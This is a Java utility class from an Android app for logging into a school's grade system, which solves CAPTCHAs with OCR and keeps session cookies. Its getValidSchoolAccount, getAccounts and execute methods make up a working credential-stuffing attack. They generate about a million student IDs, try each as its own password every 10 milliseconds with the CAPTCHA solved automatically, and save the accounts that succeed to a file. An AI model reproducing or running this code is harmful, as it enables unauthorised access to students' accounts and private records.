package com.android.chengshijian.searchplus.util;

import android.graphics.Bitmap;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.android.chengshijian.searchplus.listener.OnCheckAccountValidateListener;
import com.android.chengshijian.searchplus.listener.OnImageRequestListener;
import com.android.chengshijian.searchplus.listener.OnLoadIdentifyCodeListener;
import com.android.chengshijian.searchplus.listener.OnLoginSchoolListener;
import com.android.chengshijian.searchplus.listener.OnStringRequestListener;
import com.android.chengshijian.searchplus.model.Constant;
import com.android.chengshijian.searchplus.model.User;
import com.android.volley.AuthFailureError;
import com.android.volley.NetworkResponse;
import com.android.volley.VolleyError;
import com.orhanobut.logger.Logger;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;

/**
 * 登录工具类
 * <p>
 * Created by ChengShiJian on 2018/1/8.
 */

public class LoginUtil {

    public static final int GRADE = 0;
    public static final int GRADE_LIST = 1;
    public static final int ACCOUNT_MANAGE = 2;
    public static final int IND_CREDIT = 3;
    public static final int UPDATE_UI = 4;
    public static final int LECTURE = 5;
    public static final int PERSONAL_INFO = 6;

    private static String mIdentifyingCode;

    //线程池 容纳100个线程
    private static ExecutorService sService = Executors.newFixedThreadPool(100);

    private static boolean isAccountValidate(String account) {
        return account.length() == 10;
    }

    public static void tryLogin(String url, final User user, final OnLoginSchoolListener listener) {
        /**
         *测试完，记得加上下面代码
         */
        if (!isAccountValidate(user.getAccount())) {
            listener.onAccountLowerThan10();
            return;
        }

        /**
         * 在这里实现登录的逻辑代码
         */

        listener.onStartLogin();
        HttpRequestUtil.stringRequestByPost(url, new OnStringRequestListener() {

            @Override
            public void onResponse(String s) {
                if (s.contains(Constant.LOGIN_SUCCESS)) {
                    listener.onLoginSuccess();
                } else if (s.contains(Constant.ADDRESS_CLOSED)) {
                    listener.onAddressClosed();
                } else {
                    listener.onLoginFailed();
                }
            }

            @Override
            public void onErrorResponse(VolleyError volleyError) {
                listener.onErrorResponse(Constant.LOGIN, volleyError);
            }

            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                return DataUtil.getGradeCookieMap();
            }

            @Override
            public Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> map = new HashMap<>();
                map.put("WebUserNO", user.getAccount());
                map.put("Password", user.getPassword());
                map.put("Agnomen", mIdentifyingCode);
                return map;
            }

            @Override
            public void parseNetworkResponse(NetworkResponse response) {

            }
        });
    }

    public static void loadIdentifyingCode(String url, final OnLoadIdentifyCodeListener listener) {
        HttpRequestUtil.imageRequest(url, new OnImageRequestListener() {
            @Override
            public void onResponse(Bitmap bitmap) {
                try {
                    mIdentifyingCode = RecognizeCodeUtil.recognize(bitmap);
                    listener.onLoadIdentifyCodeSuccess(mIdentifyingCode, bitmap);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void parseNetworkResponse(NetworkResponse response) {
                Map<String, String> headers = response.headers;
                String cookies = headers.get(Constant.SET_COOKIE).replace("; path=/", "");
                //这里没有把下面这一行这段代码放在OnLoadIdentifyCodeListener的回调里去调用，是因为Cookie的使用相当频繁
                //保存时间的代码放到回调里面了
                SharedPreferencesHelper.putStringValue(Constant.COOKIE, cookies);
                listener.onGetCookie(cookies);
            }

            @Override
            public void onErrorResponse(VolleyError volleyError) {
                listener.onErrorResponse(Constant.ID_CODE, volleyError);
            }
        });
    }


    public static void isValidateAccount(final int type, final OnCheckAccountValidateListener listener) {
        listener.onStartCheck();
        new Thread(new Runnable() {
            @Override
            public void run() {
                LoginUtil.loadIdentifyingCode(Constant.IDENTIFYING_CODE_REQUEST_URL, new OnLoadIdentifyCodeListener() {

                    @Override
                    public void onLoadIdentifyCodeSuccess(String code, Bitmap bitmap) {

                        LoginUtil.tryLogin(Constant.LOGIN_URL, DataUtil.getCurrentSchoolUser(), new OnLoginSchoolListener() {
                            @Override
                            public void onStartLogin() {

                            }

                            @Override
                            public void onAccountLowerThan10() {

                            }

                            @Override
                            public void onAddressClosed() {
                                listener.onAddressClosed();


                            }

                            @Override
                            public void onLoginSuccess() {
                                listener.onCheckSuccess(type);
                            }

                            @Override
                            public void onLoginFailed() {
                                listener.onLoginFailed();

                            }

                            @Override
                            public void onErrorResponse(int type, VolleyError volleyError) {
                                listener.onErrorResponse(Constant.LOGIN, volleyError);
                            }
                        });
                    }

                    @Override
                    public void onErrorResponse(int type, VolleyError volleyError) {
                        listener.onErrorResponse(Constant.ID_CODE, volleyError);
                    }

                    @Override
                    public void onGetCookie(String cookie) {
                        listener.onGetCookie(cookie);

                    }
                });
            }
        }).start();
    }

    /**
     * 这个方法主要为了获得没有更改密码的用户账号
     * <p>
     * 获取有效的账号，并把数据写进手机根目录的account.txt文件
     */
    public static void getValidSchoolAccount() {
        final List<String> accounts = getAccounts();
        final int[] i = {0};
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                if (i[0] < accounts.size()) {
                    execute(accounts.get(i[0]++));
                }
            }
        }, 0, 10);//没10毫秒执行一次

    }

    /**
     * 获得从2001年以来的账号
     *
     * <p>
     * 只是做了一个粗略估计
     * <p>
     * 建立在一下假设上：
     * <p>
     * 学院数15个
     * <p>
     * 每个学院专业数10个
     * <p>
     * 每个专业班级数10个
     * <p>
     * 每个班级有40个人
     *
     * @return
     */
    @NonNull
    private static List<String> getAccounts() {
        final List<String> accounts = new ArrayList<>();
        for (int i = 17; i >= 1; i--) {//届数
            for (int j = 1; j < 16; j++) {//学院数
                for (int k = 1; k < 11; k++) {//学院的专业数
                    for (int m = 1; m < 11; m++) {//班级数
                        for (int n = 1; n < 41; n++) {//学号
                            accounts.add(
                                    (i < 10 ? "0" + String.valueOf(i) : String.valueOf(i))
                                            + (j < 10 ? "0" + String.valueOf(j) : String.valueOf(j))
                                            + (k < 10 ? "0" + String.valueOf(k) : String.valueOf(k))
                                            + (m < 10 ? "0" + String.valueOf(m) : String.valueOf(m))
                                            + (n < 10 ? "0" + String.valueOf(n) : String.valueOf(n))
                            );
                        }
                    }
                }
            }
        }
        return accounts;
    }

    private static void execute(final String account) {

        sService.execute(new Runnable() {
            @Override
            public void run() {
                HttpRequestUtil.imageRequest(Constant.IDENTIFYING_CODE_REQUEST_URL, new OnImageRequestListener() {
                    @Override
                    public void onResponse(Bitmap bitmap) {
                        try {
                            mIdentifyingCode = RecognizeCodeUtil.recognize(bitmap);

                            HttpRequestUtil.stringRequestByPost(Constant.LOGIN_URL, new OnStringRequestListener() {

                                @Override
                                public void onResponse(String s) {
                                    if (s.contains(Constant.LOGIN_SUCCESS)) {
                                        Logger.i("成功！");
                                        writeFileToSDCard(account.getBytes(), null, "account.txt", true, true);
                                    }
                                }

                                @Override
                                public void onErrorResponse(VolleyError volleyError) {

                                }

                                @Override
                                public Map<String, String> getHeaders() throws AuthFailureError {
                                    return DataUtil.getGradeCookieMap();
                                }

                                @Override
                                public Map<String, String> getParams() throws AuthFailureError {
                                    Map<String, String> map = new HashMap<>();
                                    map.put("WebUserNO", account);
                                    map.put("Password", account);
                                    map.put("Agnomen", mIdentifyingCode);
                                    return map;
                                }

                                @Override
                                public void parseNetworkResponse(NetworkResponse response) {

                                }
                            });
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void parseNetworkResponse(NetworkResponse response) {
                        Map<String, String> headers = response.headers;
                        String cookies = headers.get(Constant.SET_COOKIE).replace("; path=/", "");
                        //这里没有把下面这一行这段代码放在OnLoadIdentifyCodeListener的回调里去调用，是因为Cookie的使用相当频繁
                        //保存时间的代码放到回调里面了
                        SharedPreferencesHelper.putStringValue(Constant.COOKIE, cookies);
                    }

                    @Override
                    public void onErrorResponse(VolleyError volleyError) {
                    }
                });
            }
        });
    }

    /**
     * 此方法为android程序写入sd文件文件，用到了android-annotation的支持库@
     *
     * @param buffer   写入文件的内容
     * @param folder   保存文件的文件夹名称,如log；可为null，默认保存在sd卡根目录
     * @param fileName 文件名称，默认app_log.txt
     * @param append   是否追加写入，true为追加写入，false为重写文件
     * @param autoLine 针对追加模式，true为增加时换行，false为增加时不换行
     */
    public synchronized static void writeFileToSDCard(@NonNull final byte[] buffer, @Nullable final String folder, @Nullable final String fileName, final boolean append, final boolean autoLine) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                boolean sdCardExist = Environment.getExternalStorageState().equals(
                        android.os.Environment.MEDIA_MOUNTED);
                String folderPath = "";
                if (sdCardExist) {
                    //TextUtils为android自带的帮助类
                    if (TextUtils.isEmpty(folder)) {
                        //如果folder为空，则直接保存在sd卡的根目录
                        folderPath = Environment.getExternalStorageDirectory()
                                + File.separator;
                    } else {
                        folderPath = Environment.getExternalStorageDirectory()
                                + File.separator + folder + File.separator;
                    }
                } else {
                    return;
                }

                File fileDir = new File(folderPath);
                if (!fileDir.exists()) {
                    if (!fileDir.mkdirs()) {
                        return;
                    }
                }
                File file;
                //判断文件名是否为空
                if (TextUtils.isEmpty(fileName)) {
                    file = new File(folderPath + "app_log.txt");
                } else {
                    file = new File(folderPath + fileName);
                }
                RandomAccessFile raf = null;
                FileOutputStream out = null;
                try {
                    if (append) {
                        //如果为追加则在原来的基础上继续写文件
                        raf = new RandomAccessFile(file, "rw");
                        raf.seek(file.length());
                        raf.write(buffer);
                        if (autoLine) {
                            raf.write("\n".getBytes());
                        }
                    } else {
                        //重写文件，覆盖掉原来的数据
                        out = new FileOutputStream(file);
                        out.write(buffer);
                        out.flush();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    try {
                        if (raf != null) {
                            raf.close();
                        }
                        if (out != null) {
                            out.close();
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }

}
